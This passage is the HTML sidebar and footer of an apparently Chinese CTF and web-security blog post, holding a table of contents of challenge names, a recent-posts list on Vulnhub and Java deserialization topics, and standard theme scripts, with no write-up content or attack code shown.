class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到 Seove0n 的博客！<br>专注 Web 安全、CTF 竞赛与渗透测试。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GlyphWeaver"><span class="toc-number">2.1.</span> <span class="toc-text">GlyphWeaver</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CloudDiag"><span class="toc-number">2.2.</span> <span class="toc-text">CloudDiag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezUpload"><span class="toc-number">2.3.</span> <span class="toc-text">ezUpload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SecureDoc"><span class="toc-number">2.4.</span> <span class="toc-text">SecureDoc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E9%B8%A3%E5%94%B1%E5%90%A7"><span class="toc-number">2.5.</span> <span class="toc-text">一鸣唱吧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezUpload-Revenge"><span class="toc-number">2.6.</span> <span class="toc-text">ezUpload Revenge!!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Intrasight"><span class="toc-number">2.7.</span> <span class="toc-text">Intrasight</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-Java"><span class="toc-number">2.8.</span> <span class="toc-text">ez Java</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bytecode-Compiler"><span class="toc-number">2.9.</span> <span class="toc-text">Bytecode Compiler</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gogogos"><span class="toc-number">2.10.</span> <span class="toc-text">gogogos</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">3.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%AA%E5%8F%96%E7%9A%84%E7%BA%BF%E7%B4%A2"><span class="toc-number">3.1.</span> <span class="toc-text">截取的线索</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sign-in"><span class="toc-number">3.2.</span> <span class="toc-text">Sign in</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Silent-Resolver"><span class="toc-number">3.3.</span> <span class="toc-text">Silent Resolver</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Welcome"><span class="toc-number">3.4.</span> <span class="toc-text">Welcome</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E8%A3%81%E5%9B%9B%E6%AF%94%E7%89%B9-%E8%BF%99%E8%83%BD%E7%8E%A9%EF%BC%9F"><span class="toc-number">3.5.</span> <span class="toc-text">总裁四比特,这能玩？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BlueBreath"><span class="toc-number">3.6.</span> <span class="toc-text">BlueBreath</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%8E%82%E5%BA%94%E6%80%A5%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">3.7.</span> <span class="toc-text">工厂应急流量分析</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/04/Vulnhub-DC-3/" title="Vulnhub-DC-3">Vulnhub-DC-3</a><time datetime="2026-06-04T04:47:07.000Z" title="发表于 2026-06-04 12:47:07">2026-06-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/03/Vulnhub-DC-2/" title="Vulnhub-DC:2">Vulnhub-DC:2</a><time datetime="2026-06-03T07:53:12.000Z" title="发表于 2026-06-03 15:53:12">2026-06-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/02/Vulnhub-DC-1/" title="Vulnhub-DC:1">Vulnhub-DC:1</a><time datetime="2026-06-02T06:46:29.000Z" title="发表于 2026-06-02 14:46:29">2026-06-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/11/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Fastjson反序列化漏洞">Fastjson反序列化漏洞</a><time datetime="2026-05-11T12:11:13.000Z" title="发表于 2026-05-11 20:11:13">2026-05-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/27/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/" title="java反序列化-cc1链">java反序列化-cc1链</a><time datetime="2026-04-27T11:33:14.000Z" title="发表于 2026-04-27 19:33:14">2026-04-27</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Seove0n</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.5</a></span></div><div class="footer_custom_text">Seove0n's Security & CTF Blog</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><script src="/js/tw_cn.js?v=5.5.5"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.14/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.5"></script></div></div></body></html>
